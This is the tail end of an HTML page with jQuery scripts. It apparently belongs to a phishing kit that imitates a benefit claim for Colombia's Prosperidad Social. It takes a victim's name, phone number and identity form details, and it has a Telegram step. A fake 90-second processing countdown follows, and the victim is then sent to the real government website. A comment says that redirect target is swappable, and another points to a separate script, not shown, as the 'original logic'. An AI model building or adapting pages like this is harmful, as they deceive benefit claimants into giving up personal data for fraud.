        </ul>
    </div>

    <div id="notification-popup" style="display:none;"></div>
    <div id="submit-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); z-index: 10000; justify-content: center; align-items: center; flex-direction: column;">
        <div class="spinner-border spinner-custom" role="status"></div>
        <p class="mt-4 fw-bold" style="color: var(--ps-blue) !important; letter-spacing: 1.5px; font-size: 1.2rem; text-transform: uppercase;">Procesando Datos...</p>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <!-- LOGIKA ASLI ANDA TETAP BERJALAN DARI FILE INI -->
    <script src="js/logical.js"></script> 

    <script>
        $(document).ready(function() {
            setTimeout(() => {
                $('#loader-screen').css('opacity', '0');
                setTimeout(() => $('#loader-screen').remove(), 500);
            }, 500);

            $('#btn-cek-nama').on('click', function() {
                const namaValue = $('#input_nama_lengkap').val();
                if(namaValue.trim() === '') {
                    alert('Por favor, ingrese su nombre completo primero.');
                    return;
                }
                
                // Pre-fill input di step 5 dengan nama dari step 1
                $('#claim_name').val(namaValue);

                $('#submit-loader').css('display', 'flex');
                setTimeout(function() {
                    $('#submit-loader').css('display', 'none');
                    $('#custom-name-section').hide();
                    $('#custom-telegram-section').css('display', 'block');
                    $('#display_nama').text(namaValue.toUpperCase());
                    $('#full_name').val(namaValue); 
                }, 1500); 
            });

            const overlay = document.getElementById('bs-overlay');
            const closeAllModals = () => {
                overlay.classList.remove('active');
                document.querySelectorAll('.bs-modal').forEach(m => m.classList.remove('active'));
                const searchInputs = document.querySelectorAll('input[id^="bs-search"]');
                searchInputs.forEach(input => {
                    input.value = '';
                    input.dispatchEvent(new Event('input'));
                });
            };

            overlay.addEventListener('click', closeAllModals);

            const openBtn = document.getElementById('open-country-modal');
            const countryModal = document.getElementById('bs-modal');
            const searchInput = document.getElementById('bs-search');
            const listItems = document.querySelectorAll('.bs-item');
            const displayFlag = document.getElementById('display-flag');
            const displayCode = document.getElementById('display-code');

            if (openBtn) {
                openBtn.addEventListener('click', () => {
                    overlay.classList.add('active');
                    countryModal.classList.add('active');
                });
            }

            if (searchInput) {
                searchInput.addEventListener('input', function(e) {
                    const keyword = e.target.value.toLowerCase();
                    listItems.forEach(item => {
                        const searchData = (item.getAttribute('data-name') || "") + " " + (item.getAttribute('data-code') || "");
                        if (searchData.includes(keyword)) {
                            item.style.display = 'flex';
                        } else {
                            item.style.display = 'none';
                        }
                    });
                });
            }

            listItems.forEach(item => {
                item.addEventListener('click', function() {
                    const flag = this.querySelector('.flag').innerText;
                    const code = this.getAttribute('data-code');
                    displayFlag.innerText = flag;
                    displayCode.innerText = code;
                    if (typeof COUNTRY_CODE !== 'undefined') COUNTRY_CODE = code;
                    if (typeof MASK_FORMAT !== 'undefined') MASK_FORMAT = code + " ";
                    const phoneInput = document.getElementById('phone_number');
                    if (phoneInput) {
                        phoneInput.value = ""; 
                        phoneInput.focus();
                    }
                    closeAllModals();
                });
            });

            // --- TAMBAHAN LOGIKA UNTUK STEP 5 (FORMULIR IDENTITAS) & STEP 6 (LOADER) ---
            $('#claimForm').on('submit', function(e) {
                e.preventDefault();
                
                // Sembunyikan Form (Step 5) dan Tampilkan Sukses + Loader (Step 6)
                $('#step5').removeClass('active').hide();
                $('#step6').addClass('active').show();
                
                // Atur Countdown Visual 90 Detik
                let timeLeft = 90;
                const countdownEl = $('#countdown-text');
                
                const timer = setInterval(() => {
                    timeLeft--;
                    countdownEl.text('Procesando... ' + timeLeft + 's');
                    
                    if(timeLeft <= 0) {
                        clearInterval(timer);
                        // Redirect ke website resmi link dibawah bisa dignati ama web tujuan
                        window.location.href = 'https://prosperidadsocial.gov.co/';
                    }
                }, 1000); // interval 1 detik (1000 ms)
            });
            // --------------------------------------------------------------------------

        });
    </script>
</body>
</html>